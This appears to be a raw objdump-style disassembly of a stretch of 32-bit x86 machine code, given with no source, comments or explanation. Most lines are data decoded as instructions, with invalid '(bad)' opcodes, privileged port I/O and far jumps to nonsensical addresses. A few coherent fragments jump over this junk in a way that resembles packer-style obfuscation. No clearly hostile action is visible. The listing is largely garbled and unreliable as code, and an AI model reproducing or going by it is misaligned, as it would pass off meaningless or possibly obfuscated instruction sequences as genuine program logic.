  405e3c:	mov    esi,0x16a0cedf
  405e41:	mov    ah,0xb7
  405e43:	mov    ecx,0xb0bc39a9
  405e48:	dec    ecx
  405e49:	mov    bl,0xde
  405e4b:	lods   eax,DWORD PTR ds:[esi]
  405e4c:	mov    esp,0x1f858c2a
  405e51:	push   ss
  405e52:	dec    ecx
  405e53:	inc    ecx
  405e54:	pop    ecx
  405e55:	out    dx,eax
  405e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e57:	cld    
  405e58:	js     0x405e01
  405e5a:	icebp  
  405e5b:	fistp  WORD PTR [edi]
  405e5d:	xchg   edi,eax
  405e5e:	add    al,0xff
  405e60:	dec    edi
  405e61:	aad    0x51
  405e63:	imul   eax,DWORD PTR [edx+0x64],0xda958eb6
  405e6a:	jmp    0x405e48
  405e6c:	inc    ecx
  405e6d:	inc    edx
  405e6e:	shl    DWORD PTR [ecx+esi*4],0x3e
  405e72:	arpl   WORD PTR [esi-0x62ae28ce],sp
  405e78:	xchg   ebx,eax
  405e79:	sbb    BYTE PTR [edi+0x6377cde3],0x2
  405e80:	mov    cs,WORD PTR [eax]
  405e82:	and    cl,dh
  405e84:	pop    esi
  405e85:	or     DWORD PTR [esi-0x1e768cc0],ecx
  405e8b:	call   0x74ea204e
  405e90:	jns    0x405e95
  405e92:	dec    edx
  405e93:	jmp    0x405e6a
  405e95:	mov    cl,0x13
  405e97:	sub    ch,BYTE PTR [eax+0x62]
  405e9a:	add    al,al
  405e9c:	or     eax,ebx
  405e9e:	jl     0x405e20
  405ea0:	add    DWORD PTR [esi+0x26fea042],edx
  405ea6:	mov    ds:0xd8535305,al
  405eab:	fwait
  405eac:	sub    DWORD PTR [esi+0xe],eax
  405eaf:	fadd   st,st(0)
  405eb1:	pusha  
  405eb2:	xchg   esi,eax
  405eb3:	in     eax,0x57
  405eb5:	inc    ebx
  405eb6:	xlat   BYTE PTR ds:[ebx]
  405eb7:	sbb    dl,bl
  405eb9:	sbb    BYTE PTR [eax],0x31
  405ebc:	fidivr WORD PTR [edx]
  405ebe:	retf   
  405ebf:	dec    edx
  405ec0:	dec    ebp
  405ec1:	dec    ecx
  405ec2:	xchg   BYTE PTR [ecx],al
  405ec4:	cmp    al,bh
  405ec6:	xor    ah,BYTE PTR [eax-0xf]
  405ec9:	in     eax,0xd7
  405ecb:	sbb    eax,0x2490526a
  405ed0:	mov    ebx,0x1a57771a
  405ed5:	add    al,0x67
  405ed7:	shl    BYTE PTR [ebp+0x29],0x50
  405edb:	mov    edi,0xc7a8c147
  405ee0:	xor    esp,DWORD PTR [edx-0x4d432f4]
  405ee6:	ds jnp 0x405f4a
  405ee9:	cs fs mov ah,0x75
  405eed:	dec    esi
  405eee:	xchg   esi,eax
  405ef0:	(bad)  
  405ef2:	pop    ecx
  405ef3:	cmp    al,0xcd
  405ef5:	iret   
  405ef6:	pusha  
  405ef7:	test   BYTE PTR [eax],0x57
  405efa:	cmp    ebp,DWORD PTR [ebx]
  405efc:	jnp    0x405eea
  405efe:	xchg   edx,eax
  405eff:	aas    
  405f00:	lods   al,BYTE PTR ds:[esi]
  405f01:	cmp    DWORD PTR [edi+0x3f],edx
  405f04:	pop    esp
  405f05:	pushf  
  405f06:	loop   0x405f6f
  405f08:	mov    al,ds:0x14590841
  405f0d:	add    ecx,DWORD PTR ds:0x53bd0d8b
  405f13:	add    bl,dl
  405f15:	js     0x405ecd
  405f17:	stos   BYTE PTR es:[edi],al
  405f18:	scas   al,BYTE PTR es:[edi]
  405f19:	mov    al,ds:0xca9654f
  405f1e:	adc    eax,DWORD PTR [ebx-0x31fbbb75]
  405f24:	rcl    BYTE PTR [esi+0x7d377506],cl
  405f2a:	shl    DWORD PTR [ebp+ebp*8-0x72],0xe6
  405f2f:	push   esp
  405f30:	push   esi
  405f31:	ins    DWORD PTR es:[edi],dx
  405f32:	mov    cl,0x2
  405f34:	xchg   esp,eax
  405f35:	mov    edi,0x7c8c4af4
  405f3b:	iret   
  405f3c:	adc    DWORD PTR [eax],ecx
  405f3e:	dec    esp
  405f3f:	mov    bl,0x90
  405f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f42:	push   ss
  405f43:	cmp    eax,0x4dd0bfa1
  405f48:	dec    esi
  405f49:	rcr    BYTE PTR [ebp+0x31bfd3ed],cl
  405f4f:	fcom   QWORD PTR [ecx]
  405f51:	pop    ds
  405f52:	loopne 0x405f9b
  405f54:	pop    edi
  405f55:	adc    BYTE PTR [ebp-0x43],ah
  405f58:	inc    edx
  405f59:	mov    dl,0x4d
  405f5b:	sub    eax,DWORD PTR [esi]
  405f5d:	cld    
  405f5e:	out    dx,al
  405f5f:	sub    ecx,edx
  405f61:	dec    esi
  405f62:	jle    0x405fa1
  405f64:	cvtpi2ps xmm0,QWORD PTR [ebx+0x31]
  405f68:	inc    esp
  405f69:	daa    
  405f6a:	sbb    al,0xc6
  405f6c:	into   
  405f6d:	mov    ecx,0x4c116d74
  405f72:	stos   DWORD PTR es:[edi],eax
  405f73:	dec    esp
  405f74:	imul   BYTE PTR [ecx]
  405f76:	inc    esi
  405f77:	and    dh,0xa6
  405f7a:	xor    al,BYTE PTR [eax]
  405f7c:	rcr    BYTE PTR [ebx],0xc2
  405f7f:	pusha  
  405f80:	and    al,0xc4
  405f82:	stos   BYTE PTR es:[edi],al
  405f83:	jae    0x405fbb
  405f85:	cdq    
  405f86:	adc    al,0xa1
  405f88:	pop    esi
  405f89:	ficomp WORD PTR [edi-0x2d05df4c]
  405f8f:	cmp    eax,0x247e8089
  405f94:	jae    0x405f1f
  405f96:	pop    eax
  405f97:	pop    eax
  405f98:	fsub   DWORD PTR [ecx-0x3c]
  405f9b:	adc    cl,bl
  405f9d:	rcl    BYTE PTR [eax-0x10],1
  405fa0:	ja     0x405f57
  405fa2:	adc    al,0x49
  405fa4:	lock out 0x4a,al
  405fa7:	mov    esi,0xbd509354
  405fac:	and    ch,ah
  405fae:	nop
  405faf:	add    ebp,DWORD PTR [esi+0x1d]
  405fb2:	cmp    DWORD PTR [edi],edx
  405fb4:	jne    0x405f5c
  405fb6:	into   
  405fb7:	lds    esi,FWORD PTR [ebx]
  405fb9:	mov    esi,0x98f0cefa
  405fbe:	mov    dl,0x6a
  405fc0:	cmp    edi,ecx
  405fc2:	fisubr DWORD PTR [esi]
  405fc4:	aad    0xb
  405fc6:	mov    al,0xa8
  405fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fc9:	jae    0x406030
  405fcb:	mov    bh,BYTE PTR [esi+0x1273d611]
  405fd1:	pmaddwd mm6,QWORD PTR [ebx+0x34abd23a]
  405fd8:	test   eax,0x375e8145
  405fdd:	rcl    DWORD PTR [edi+ebx*8-0x37],1
  405fe1:	pop    esi
  405fe2:	sbb    ebp,DWORD PTR [eax]
  405fe4:	popa   
  405fe5:	sub    al,ch
  405fe7:	push   esi
  405fe8:	pop    ss
  405fe9:	pop    ss
  405fea:	sub    edi,DWORD PTR [eax-0x7f]
  405fed:	cld    
  405fee:	outs   dx,BYTE PTR ds:[esi]
  405fef:	mov    ecx,0x7b175e2d
  405ff4:	fldenv [ebx+0x45]
  405ff7:	in     eax,0x9c
  405ff9:	jbe    0x405f81
  405ffb:	adc    DWORD PTR [esi-0x1a],edi
  405ffe:	inc    ecx
  405fff:	test   DWORD PTR [ecx-0x1c83b6e],0x5a6f29a2
  406009:	mov    dh,BYTE PTR [ebx-0x28bec8f5]
  40600f:	mov    edx,0x9406fd5d
  406014:	push   esp
  406015:	or     ebx,edx
  406017:	mov    eax,ds:0xb2fd35b5
  40601c:	sub    al,0xbe
  40601e:	scas   al,BYTE PTR es:[edi]
  40601f:	add    edi,DWORD PTR [ebp-0x230f5467]
  406025:	mov    dh,0xad
  406027:	jns    0x40606d
  406029:	std    
  40602a:	jecxz  0x405fcb
  40602c:	sbb    al,0x96
  40602e:	push   ds
  40602f:	(bad)  
  406030:	es jl  0x40605a
  406033:	sub    al,0x77
  406035:	aad    0xdd
  406037:	fmul   DWORD PTR [ecx]
  406039:	push   esi
  40603a:	fst    DWORD PTR [ebx]
  40603c:	mov    dl,ah
  40603e:	mov    al,0xcb
  406040:	mov    ds:0x5f61e8,eax
  406045:	add    BYTE PTR [eax+0x6b5b643e],al
  40604b:	ss retf 0x8ac0
  40604f:	cmp    al,0x30
  406051:	xor    eax,DWORD PTR [eax-0x339b5ed]
  406057:	fisttp DWORD PTR [ebx]
  406059:	and    ebx,ebx
  40605b:	and    BYTE PTR [ebx],ah
  40605d:	and    al,0x25
  40605f:	sbb    al,0x9d
  406061:	push   edi
  406062:	push   es
  406063:	or     ch,BYTE PTR [ecx+0x4cbd2c1]
  406069:	icebp  
  40606a:	dec    ebp
  40606b:	fmul   st,st(5)
  40606d:	or     DWORD PTR [ecx],edx
  40606f:	or     edi,DWORD PTR [ebp-0x63f2b3a1]
  406075:	push   esp
  406076:	mov    esp,0x6aac04f8
  40607b:	mov    edi,0x3be08b9d
  406080:	cmp    dh,ch
  406082:	dec    ebx
  406083:	pop    ss
  406084:	push   ebx
  406085:	mov    ds:0x598e14cf,eax
  40608a:	icebp  
  40608b:	lea    ecx,[edx-0x70]
  40608e:	loope  0x4060f1
  406090:	mov    edx,0x10fb0821
  406095:	test   DWORD PTR [eax-0x66],0x2322598b
  40609c:	cli    
  40609d:	sbb    bl,BYTE PTR [esi]
  40609f:	arpl   WORD PTR [eax],ax
  4060a1:	jb     0x4060de
  4060a3:	jp     0x40602f
  4060a5:	les    esp,FWORD PTR [esi]
  4060a7:	mov    dh,ah
  4060a9:	mov    edi,0x41865922
  4060ae:	xor    esi,ebx
  4060b0:	sub    al,0x50
  4060b2:	xor    al,0xb7
  4060b4:	adc    eax,0xb46ec5bc
  4060b9:	pop    edi
  4060ba:	sub    esi,DWORD PTR [eax-0x25]
  4060bd:	dec    edx
  4060be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060bf:	push   esp
  4060c0:	sub    BYTE PTR ds:0x9b27e065,dl
  4060c6:	sub    eax,0xda709b91
  4060cb:	(bad)  [edi+0x24]
  4060ce:	and    cl,BYTE PTR [ebx]
  4060d0:	pop    es
  4060d1:	ins    DWORD PTR es:[edi],dx
  4060d2:	shl    BYTE PTR ds:0x270450b,0x88
  4060d9:	jecxz  0x40610b
  4060db:	dec    eax
  4060dc:	arpl   WORD PTR [eax-0x193c564f],dx
  4060e2:	lea    eax,[edx]
  4060e4:	xor    ebx,eax
  4060e6:	jne    0x406082
  4060e8:	out    dx,eax
  4060e9:	lods   eax,DWORD PTR ds:[esi]
  4060ea:	out    dx,al
  4060eb:	cld    
  4060ec:	sbb    dh,dh
  4060ee:	fnop   
  4060f0:	dec    esi
  4060f1:	push   0x5a
  4060f3:	push   ss
  4060f4:	cmc    
  4060f5:	jne    0x40616a
  4060f7:	lea    eax,[ebp+eax*1-0x4]
  4060fb:	mov    DWORD PTR [ebp-0x34],eax
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	enter  0x642,0x6a
  406130:	js     0x4060d5
  406132:	sbb    BYTE PTR [eax],bl
  406134:	sahf   
  406135:	adc    bl,BYTE PTR [eax]
  406137:	sbb    dh,bh
  406139:	mov    ecx,0x618f28d7
  40613e:	sub    BYTE PTR [edi],bh
  406140:	adc    cl,ch
  406142:	adc    al,0xb0
  406144:	fbld   TBYTE PTR [eax]
  406146:	mov    cl,0x1
  406148:	stos   BYTE PTR es:[edi],al
  406149:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40614a:	scas   al,BYTE PTR es:[edi]
  40614b:	addr16 push ecx
  40614d:	mov    BYTE PTR [ecx-0x6381e31a],ch
  406153:	aam    0xac
  406155:	pop    esi
  406156:	inc    edi
  406157:	adc    DWORD PTR [edi+0x4f],esi
  40615a:	repnz sub BYTE PTR [esi+0x7d],dl
  40615e:	scas   al,BYTE PTR es:[edi]
  40615f:	mov    bh,ah
  406161:	enter  0x163f,0x58
  406165:	mov    eax,ds:0xdf7ef01d
  40616a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40616b:	push   ds
  40616c:	push   ss
  40616d:	xchg   BYTE PTR [ecx-0x71ee93d1],al
  406173:	xchg   edi,eax
  406174:	imul   ebp,DWORD PTR [esi+edx*2],0x36015143
  40617b:	mov    dl,0x7b
  40617d:	lea    edx,[esi+0x35046446]
  406183:	dec    edx
  406184:	in     al,dx
  406185:	cmc    
  406186:	sbb    cl,BYTE PTR [ebx+0x6c]
  406189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40618a:	hlt    
  40618b:	mov    ch,0x1e
  40618d:	adc    DWORD PTR [ebx],ebx
  40618f:	les    esi,FWORD PTR [edi+0x1b]
  406192:	sar    DWORD PTR [esi],1
  406194:	mov    ebp,0x577916ed
  406199:	test   BYTE PTR [ebx+0x5d50a481],dh
  40619f:	aad    0xdd
  4061a1:	inc    eax
  4061a2:	jns    0x406196
  4061a4:	push   0x2c
  4061a6:	scas   al,BYTE PTR es:[edi]
  4061a7:	les    esi,FWORD PTR [ebx]
  4061a9:	repz dec esp
  4061ab:	ds pop esi
  4061ad:	push   0xffffff8c
  4061af:	or     edx,edx
  4061b1:	mov    ah,BYTE PTR [ecx-0x1190add4]
  4061b7:	ds jns 0x4061e4
  4061ba:	add    edx,DWORD PTR [ebp-0x7b]
  4061bd:	mov    edx,0x935649bb
  4061c2:	shr    BYTE PTR [eax],1
  4061c4:	jg     0x40619b
  4061c6:	rcl    BYTE PTR [ebx-0xfe53a6c],1
  4061cc:	cmc    
  4061cd:	add    ch,dl
  4061cf:	cld    
  4061d0:	jae    0x406204
  4061d2:	and    dl,al
  4061d4:	xor    esp,edx
  4061d6:	and    eax,0x34cc0f52
  4061db:	scas   al,BYTE PTR es:[edi]
  4061dc:	inc    ebx
  4061dd:	test   DWORD PTR [esp+esi*1+0x70cf2a30],esi
  4061e4:	imul   ebx,DWORD PTR [ebx],0x7ca11430
  4061ea:	inc    ebp
  4061eb:	loopne 0x406230
  4061ed:	icebp  
  4061ee:	mov    ah,0x9f
  4061f0:	les    edx,FWORD PTR [ebx-0x7082523f]
  4061f6:	arpl   WORD PTR [ebp-0x3f],dx
  4061f9:	pop    esi
  4061fa:	mov    ch,0xe3
  4061fc:	xchg   esp,eax
  4061fd:	cmp    edx,DWORD PTR [edx+ecx*8]
  406200:	lahf   
  406201:	imul   edi,eax,0x0
  406204:	push   edi
  406205:	mov    ah,0x79
  406207:	push   ecx
  406208:	or     eax,0x6e31598e
  40620d:	loope  0x40620c
  40620f:	and    eax,0x1e4bc871
  406214:	jge    0x406294
  406216:	js     0x406232
  406218:	adc    ecx,edi
  40621a:	push   eax
  40621b:	pop    eax
  40621c:	loopne 0x406216
  40621e:	lock lock aaa 
  406221:	(bad)  
  406222:	int3   
  406223:	xchg   BYTE PTR [ebx+ebp*1+0x1e],bl
  406227:	mov    bl,0x7e
  406229:	cmp    dl,BYTE PTR [eax-0xb44649f]
  40622f:	in     al,dx
  406230:	jo     0x406248
  406232:	ror    BYTE PTR ds:0xe5c6fc4d,cl
  406238:	and    al,0xbd
  40623a:	imul   esp,DWORD PTR [ebx-0x25],0x4d
  40623e:	ficomp WORD PTR [edi+eiz*1+0x40]
  406242:	arpl   WORD PTR [esi+ecx*8],dx
  406245:	lahf   
  406246:	cmc    
  406247:	inc    esp
  406248:	xchg   esp,eax
  406249:	xchg   edi,eax
  40624a:	jp     0x406241
  40624c:	jge    0x40621b
  40624e:	int    0xf0
  406250:	xlat   BYTE PTR ds:[ebx]
  406251:	scas   al,BYTE PTR es:[edi]
  406252:	scas   eax,DWORD PTR es:[edi]
  406253:	dec    esp
  406254:	jecxz  0x406294
  406256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406257:	xchg   esp,eax
  406258:	sar    DWORD PTR [esi+0x70ebf79b],cl
  40625e:	aam    0x81
  406260:	jp     0x4062b0
  406262:	mov    cl,0x2a
  406264:	repnz pop es
  406266:	push   edx
  406267:	mov    esi,0xa627086d
  40626c:	icebp  
  40626d:	cwde   
  40626e:	call   0x2121:0x884d691c
  406275:	sysexit 
  406277:	cmp    BYTE PTR [ebp-0x26],bl
  40627a:	inc    edx
  40627b:	(bad)  
  40627d:	xchg   BYTE PTR [ebp-0xc],al
  406280:	sbb    BYTE PTR [ecx],cl
  406282:	adc    DWORD PTR ds:0xef22a41,ebp
  406288:	test   al,0x8a
  40628a:	scas   eax,DWORD PTR es:[edi]
  40628b:	lea    ecx,[edx-0x35]
  40628e:	push   esi
  40628f:	in     al,0x7
  406291:	xchg   edx,eax
  406292:	cmp    ebp,DWORD PTR [ecx+0x2cd8d887]
  406298:	rcl    DWORD PTR [ebx],0xb4
  40629b:	mov    gs,WORD PTR cs:[edi+0x12]
  40629f:	sbb    DWORD PTR [edx-0x5c8f2ba4],0x3a
  4062a6:	push   edi
  4062a7:	(bad)  
  4062a8:	mov    dl,0x95
  4062aa:	jp     0x4062d6
  4062ac:	and    BYTE PTR [ebx-0x49],dh
  4062af:	gs mov ah,0x6
  4062b2:	aaa    
  4062b3:	lahf   
  4062b4:	sbb    ebp,edx
  4062b6:	fbstp  TBYTE PTR [eax]
  4062b8:	mov    bh,0x7b
  4062ba:	out    0xaa,eax
  4062bc:	dec    ecx
  4062bd:	or     BYTE PTR [edi],al
  4062bf:	xor    eax,0xc9c961a3
  4062c4:	out    0xf5,al
  4062c6:	shl    BYTE PTR [ebp+edi*4+0x4c],0x2
  4062cb:	or     eax,0x58b94df
  4062d0:	or     ebx,edx
  4062d2:	jge    0x40634b
  4062d4:	or     bl,BYTE PTR [edx+eiz*2+0x6f]
  4062d8:	ficom  DWORD PTR [esi]
  4062da:	xor    al,0x3b
  4062dd:	out    0x9b,al
  4062df:	dec    edx
  4062e0:	jo     0x4062c4
  4062e2:	jb     0x4062e3
  4062e4:	and    ah,BYTE PTR [ecx+edx*2-0x73]
  4062e8:	push   ecx
  4062e9:	jg     0x40633a
  4062eb:	in     al,dx
  4062ec:	xchg   ebx,eax
  4062ed:	test   DWORD PTR [ecx],0x9a59f233
  4062f3:	mov    ds:0x3c314d3b,al
  4062f8:	mov    ecx,0xae993118
  4062fd:	dec    ecx
  4062fe:	push   esi
  4062ff:	gs call 0xd988bd9e
  406305:	out    0xad,eax
  406307:	jnp    0x406348
  406309:	in     eax,0xa0
  40630b:	pop    edi
  40630c:	or     DWORD PTR [edi],0xffffffff
  40630f:	fisubr DWORD PTR [edx-0x19e0f6e2]
  406315:	rcl    BYTE PTR [eax+edi*4+0x4c62cac1],cl
  40631c:	cdq    
  40631d:	addr16 push ds
  40631f:	xlat   BYTE PTR ds:[ebx]
  406320:	addr16 push ss
  406322:	daa    
  406323:	xchg   edi,eax
  406324:	jbe    0x40630f
  406326:	shr    eax,1
  406328:	add    esp,DWORD PTR [edx]
  40632a:	cmp    DWORD PTR [eax-0x701cdce],ebx
  406330:	lock jnp 0x406393
  406333:	and    edx,edx
  406335:	ins    DWORD PTR es:[edi],dx
  406336:	and    al,0xb
  406338:	xor    ebx,DWORD PTR [edi-0x19]
  40633b:	add    DWORD PTR ds:0x4c8efeee,ecx
  406341:	adc    eax,0xfbeaf151
  406346:	out    0x3,al
  406348:	imul   edx,eax,0xd2ed3b4f
  40634e:	mov    dh,0x2c
  406350:	addr16 pop esi
  406352:	jmp    0xefd9:0x2279ea4f
  406359:	mul    DWORD PTR [eax]
  40635b:	repnz inc edi
  40635d:	cld    
  40635e:	push   ebx
  40635f:	pop    edi
  406360:	imul   ebx,DWORD PTR [ebp+ebp*1-0x35],0x68
  406365:	mov    eax,0xb9db8ea4
  40636a:	mov    ds:0xb16501ae,al
  40636f:	inc    esi
  406370:	cli    
  406371:	dec    ebp
  406372:	push   ecx
  406373:	imul   edi,ebx,0xffffffc8
  406376:	jnp    0x4063ef
  406378:	into   
  406379:	mov    ds:0xfc0bb77f,eax
  40637e:	xchg   edx,eax
  40637f:	into   
  406380:	pop    esp
  406381:	shl    BYTE PTR [edx-0x4d],0xe8
  406385:	ror    DWORD PTR [ebx-0x115d080a],cl
  40638b:	pop    edx
  40638c:	(bad)  
  40638d:	shr    DWORD PTR [ebx+esi*2],cl
  406390:	stos   DWORD PTR es:[edi],eax
  406391:	xlat   BYTE PTR ds:[ebx]
  406392:	sub    BYTE PTR ds:[ebx],dl
  406395:	sti    
  406396:	mov    bl,0x9d
  406398:	mov    ds:0xa5aa04a7,eax
  40639d:	test   BYTE PTR [ebp+0x503c1c2b],bl
  4063a3:	les    ebx,FWORD PTR [edx]
  4063a5:	call   0x4d59:0x281d5171
  4063ac:	(bad)  
  4063ad:	xchg   esi,eax
  4063ae:	sar    BYTE PTR [edx],1
  4063b0:	call   0x6ff2:0x4d15f2c1
  4063b7:	mov    DWORD PTR [edx+0x879a6b6],ebp
  4063bd:	sub    DWORD PTR gs:[edi-0x7ffba5cb],eax
  4063c4:	fcom   DWORD PTR [edi]
  4063c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c7:	jno    0x4063d9
  4063c9:	jecxz  0x406445
  4063cb:	(bad)  
  4063cc:	test   edi,0x5d387e0a
  4063d2:	jmp    0x892e72a6
  4063d7:	dec    edi
  4063d8:	and    BYTE PTR [edx+0x3a],cl
  4063db:	dec    edi
  4063dc:	cmp    BYTE PTR [edx],bh
  4063de:	or     ebx,DWORD PTR [edx]
  4063e0:	aam    0x5b
  4063e2:	fs in  al,0x4a
  4063e5:	sahf   
  4063e6:	ds jmp 0x619b5f53
  4063ec:	push   0xffffff83
  4063ee:	jmp    0x40646a
  4063f0:	mov    WORD PTR [ebx+0x20],?
  4063f3:	sbb    ch,BYTE PTR [ebx-0x4b91bdae]
  4063f9:	lea    ecx,[edx]
  4063fb:	int3   
  4063fc:	add    BYTE PTR [ebp-0x1],cl
  4063ff:	mov    ds:0xbde0bd15,eax
  406404:	jae    0x4063ad
  406406:	dec    eax
  406407:	sub    eax,0x8fae3cec
  40640c:	mov    ecx,DWORD PTR [ebp-0x130892f5]
  406412:	dec    eax
  406413:	gs inc edi
  406415:	scas   eax,DWORD PTR es:[edi]
  406416:	not    ebp
  406418:	cwde   
  406419:	add    DWORD PTR ds:0x6f55bf65,ebx
  40641f:	mov    dl,dh
  406421:	fucomip st,st(3)
  406423:	shr    DWORD PTR [edx+0x3d],1
  406426:	sar    ch,cl
  406428:	adc    al,0x35
  40642a:	and    eax,0xbd29bd2a
  40642f:	mov    eax,ss:0xb03e3527
  406435:	test   DWORD PTR ds:0x35ee66e9,ebx
  40643b:	jb     0x4063e1
  40643d:	pop    edi
  40643e:	mov    BYTE PTR [ebx-0x380adcb5],bh
  406444:	or     eax,0x1a578725
  406449:	jo     0x406454
  40644b:	fsubr  DWORD PTR [ebx-0x4d6bc9fa]
  406451:	mov    al,0x90
  406453:	cmp    esi,eax
  406455:	sbb    eax,0xed2e44b3
  40645a:	popa   
  40645b:	add    bl,ch
  40645d:	inc    edx
  40645e:	gs mov dl,0x60
  406461:	pop    ecx
  406462:	push   cs
  406463:	and    ebx,DWORD PTR [ebx]
  406465:	dec    esi
  406466:	sub    ah,BYTE PTR [ebx]
  406468:	inc    dh
  40646a:	pop    ds
  40646b:	add    al,0x88
  40646d:	movlps QWORD PTR [edi-0x32931782],xmm7
  406474:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406475:	add    DWORD PTR [edi+0x3cf85002],ecx
  40647b:	leave  
  40647c:	int    0x22
  40647e:	loop   0x4064e9
  406480:	iret   
  406481:	or     al,0xa8
  406483:	push   ecx
  406484:	scas   eax,DWORD PTR es:[edi]
  406485:	cmp    cl,BYTE PTR [edi+0x149c07b7]
  40648b:	in     al,dx
  40648c:	push   edi
  40648d:	jnp    0x406488
  40648f:	clc    
  406490:	jo     0x4064a7
  406492:	popa   
  406493:	jbe    0x4064d3
  406495:	ret    0x8d29
  406498:	imul   eax,DWORD PTR [ecx+ebp*4],0xb22062b0
  40649f:	or     BYTE PTR [edx+0x24],cl
  4064a2:	(bad)  [eax-0x5bec8d36]
  4064a8:	mov    ch,0x41
  4064aa:	ret    0x678e
  4064ad:	data16 jle 0x406449
  4064b0:	and    ch,BYTE PTR [edx]
  4064b2:	jnp    0x40646b
  4064b4:	mov    al,0xf3
  4064b6:	xor    BYTE PTR [esi+0x2d782ca7],0x64
  4064bd:	mov    edx,0xbc524cd6
  4064c2:	sbb    al,0x22
  4064c4:	stc    
  4064c5:	and    BYTE PTR es:[esi+ebp*4-0x28234a8e],cl
  4064cd:	ja     0x4064fc
  4064cf:	mov    dl,0x80
  4064d1:	pop    ecx
  4064d2:	(bad)  
  4064d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d4:	in     al,0x42
  4064d6:	scas   eax,DWORD PTR es:[edi]
  4064d7:	inc    edi
  4064d8:	pop    ebp
  4064d9:	je     0x406557
  4064db:	fisubr DWORD PTR [eax+esi*8]
  4064de:	cdq    
  4064df:	es xchg esp,eax
  4064e1:	jnp    0x4064f9
  4064e3:	pusha  
  4064e4:	nop
  4064e5:	sub    BYTE PTR [ebp+0x54],dh
  4064e8:	push   ebp
  4064e9:	jp     0x4064d9
  4064eb:	pop    ebp
  4064ec:	(bad)  
  4064ed:	cmp    ecx,eax
  4064ef:	dec    edi
  4064f0:	inc    edi
  4064f1:	add    eax,0x594139ef
  4064f6:	inc    esp
  4064f7:	mov    ebx,0x8ac20b14
  4064fc:	or     al,0x8
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi-0x55a8b02c],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	ror    DWORD PTR [eax],1
  406558:	adc    esp,DWORD PTR [edi]
  40655a:	outs   dx,DWORD PTR ds:[esi]
  40655b:	xchg   DWORD PTR [ebx],edi
  40655d:	out    0xc5,eax
  40655f:	jmp    0xeb03e42d
  406564:	push   eax
  406565:	or     esp,DWORD PTR [ebx+0x1b359190]
  40656b:	cs xchg edx,eax
  40656d:	test   BYTE PTR [edx-0x1f],ch
  406570:	jp     0x40653b
  406572:	and    al,0x77
  406574:	push   0x9f9acd0b
  406579:	dec    edx
  40657a:	jnp    0x406575
  40657c:	shr    eax,1
  40657e:	jle    0x406522
  406580:	xchg   ebp,eax
  406581:	(bad)
  406584:	and    bh,BYTE PTR [ebp+0x508cc241]
  40658a:	js     0x4065c5
  40658c:	js     0x4065bf
  40658e:	and    eax,0x79b5dc7
  406593:	cmp    ah,ch
  406595:	add    edi,DWORD PTR ds:0x379c6ef5
  40659b:	fwait
  40659c:	in     eax,0x9f
  40659e:	pop    esp
  40659f:	pop    ebx
  4065a0:	push   es
  4065a1:	sbb    dl,BYTE PTR [eax-0x665424f]
  4065a7:	stc    
  4065a8:	fiadd  WORD PTR [edx+0xc]
  4065ab:	push   es
  4065ac:	je     0x4065e9
  4065ae:	mov    ebx,0x2157a8c0
  4065b3:	mov    ecx,0x76d33f6c
  4065b8:	xchg   BYTE PTR [ebx],dh
  4065ba:	cmp    ecx,DWORD PTR [ecx]
  4065bc:	and    ecx,DWORD PTR [eax]
  4065be:	jl     0x40663f
  4065c0:	addr16 in eax,0x5
  4065c3:	(bad)  
  4065c4:	push   0x60
  4065c6:	nop
  4065c7:	mov    esi,0x2ee58a45
  4065cc:	sub    bh,BYTE PTR fs:[ecx+0x6d]
  4065d0:	retf   
  4065d1:	jl     0xd9636097
  4065d7:	sbb    al,0xb8
  4065da:	pusha  
  4065db:	or     al,BYTE PTR [ebp-0x777b1791]
  4065e1:	fsubr  QWORD PTR [eax]
  4065e3:	or     bl,ch
  4065e5:	std    
  4065e6:	pop    ebx
  4065e7:	ficom  DWORD PTR [eax]
  4065e9:	dec    BYTE PTR [ebx]
  4065eb:	jb     0x4065cf
  4065ed:	fst    DWORD PTR [esi]
  4065ef:	ret    0xb7c1
  4065f2:	mov    ebp,DWORD PTR [esi+0x62]
